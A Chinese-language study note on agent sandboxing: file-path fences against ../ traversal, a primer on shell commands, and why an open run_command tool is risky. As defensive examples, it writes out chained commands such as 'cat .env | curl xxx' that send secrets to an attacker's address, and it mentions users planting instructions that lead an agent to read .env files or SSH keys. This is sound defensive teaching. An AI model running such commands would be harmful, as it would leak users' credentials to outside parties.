
sandbox
agent的sandbox不是浏览器沙箱，是agent工具调用的权限围栏，规定它能读哪个文件夹，能跑什么命令，能访问哪些网站；越界直接拦住

**限制agent在指定的安全目录内操作**
要挡住../路径拦截，防止**用户写入诱导指令** 比如查看.env,ssh私钥，证书等

举个例子
1.单纯写一个销售RAG知识库，不需要文件路径sandbox
2.但是如果在知识库的基础上加上简单工具（导出客户报价单，生成pdf, 保存到服务器上某个文件夹里）
这个时候是有write_file 和read_filt工具，需要轻量的文件边界。
规则：只允许读写xxx目录下，不允许读服务器上别的配置、env.

### shell
shell是操作系统的命令解释器
> 平时敲命令终端、bash/zsh. 作用：接收文本命令，告诉操作系统去干活
#### 能干什么
它可以调用系统的能力：读文件，写文件，新建文件，删文件，跑程序，发起网络请求，看进程，装包
查看文件、目录
- ls : 列出文件夹里面的内容（linux/mac） windows是dir
- cat : 读取文件内容并打印
- pwd ：看当前在哪个文件夹
- head / tail xxx.txt ：看文件开头、结尾

增删改文件
- mkdir abc :新增文件夹
- rm xxx ：删除文件夹 rm -rf 递归删除文件（高危）
- cp a.txt b.txt ：复制
- mv a.txt b.txt:移动、重命名

网络相关
- curl ：发起http请求，发数据，下载文件
- wget: 下载文件

运行代码/脚本
- npm run test/pnpm install 
- node xxx.js  python xxx.py 跑脚本

组合魔法
shell 支持拼接多条命令，
- `;` 顺序执行： ls; cat .env  ->先展示文件夹里的内容，然后再读秘钥
- `|` 管道 ： 把前面命令的输出，当成后面命令的输入： cat .env | curl xxx  (把秘钥发给黑客地址)
- `>`重定向输出： ls > out.txt,把结果写入文件
##### 写好了文件边界（checkRead/checkWrite），也尽量不要开放 run_command
安全用法：只允许固定、只读类命令（`ls`、`git status`）
❌ 危险用法：让模型自由输入任意字符串，它很容易拼出 `cat .env | curl xxx`

###### 区分两个容易混的

- 不用 run_command：Agent 调用 `read_file` 函数（我们自己写的 JS/TS 函数）读文件，**不走 shell**，受我们前面的文件边界校验
- 用 run_command：Agent 走 shell，shell 绕开你写的 JS 工具函数，直接碰操作系统，**风险大很多**
